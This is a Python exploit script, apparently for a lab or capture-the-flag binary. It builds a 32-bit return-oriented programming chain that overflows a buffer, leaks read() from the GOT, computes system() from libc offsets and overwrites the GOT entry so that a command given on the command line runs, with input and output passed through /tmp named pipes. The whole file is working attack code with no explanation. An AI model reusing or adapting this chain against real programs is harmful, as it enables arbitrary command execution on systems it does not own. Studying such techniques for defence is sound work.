import os,sys,time
import struct 
 
pipe = "/tmp/roppipe"

pipe2 = "/tmp/roppipe2"
 
payload = "A"*140 
 
cmd = sys.argv[1] + "\0" 
 
# write stdin (/bin/sh) to .dynamic 
payload += struct.pack("<I",0x0804832c) # read@plt as return address
payload += struct.pack("<I",0x080484b6) # address of pppr gadget 
payload += struct.pack("<I",0)          # read param 1: stdin fd 
payload += struct.pack("<I",0x08049530) # read param 2: address of .dynamic 
payload += struct.pack("<I",len(cmd))   # read param 3: length of input 

# leak address of read via writing to stdout
payload += struct.pack("<I",0x0804830c) # write@plt as return address
payload += struct.pack("<I",0x080484b6) # address of ppr gadget
payload += struct.pack("<I",1)          # write param 1: stdout fd
payload += struct.pack("<I",0x0804961c) # write param 2: address of read @Got
payload += struct.pack("<I",4)          # write param 3: size 

# write stdin to GoT entry for read
payload += struct.pack("<I",0x0804832c) # read@plt as return address
payload += struct.pack("<I",0x080484b6) # address of ppr gadget
payload += struct.pack("<I",0)          # read param 1: stdin fd
payload += struct.pack("<I",0x0804961c) # read param 2: address of read @Got
payload += struct.pack("<I",4)          # read param 3: size

# call read@plt = addr of system() in libc
payload += struct.pack("<I",0x0804832c) # read@plt to call
payload += "BBBB"                       # bogus return address
payload += struct.pack("<I",0x08049530)

# test code 
f = open(pipe,"w")
f2 = open(pipe2,"r")

f.write(payload) 
f.flush()
time.sleep(1)

f.write(cmd)
f.flush()
time.sleep(1)

read_addr = struct.unpack("<I",f2.read(4))[0]

print("libc read() found at {:x}".format(read_addr))

libc_read_offset = 0xdd0b0
libc_system_offset = 0x3df50
system_addr = read_addr - libc_read_offset + libc_system_offset
print("libc system() calculated at {:x}".format(system_addr))

f.write(struct.pack("<I",system_addr))
f.flush()

while(True):
    c = f2.read(1)
    if(not(c)):
        print("end of pipe")
        break
    sys.stdout.write(c)

f2.close()
f.close()


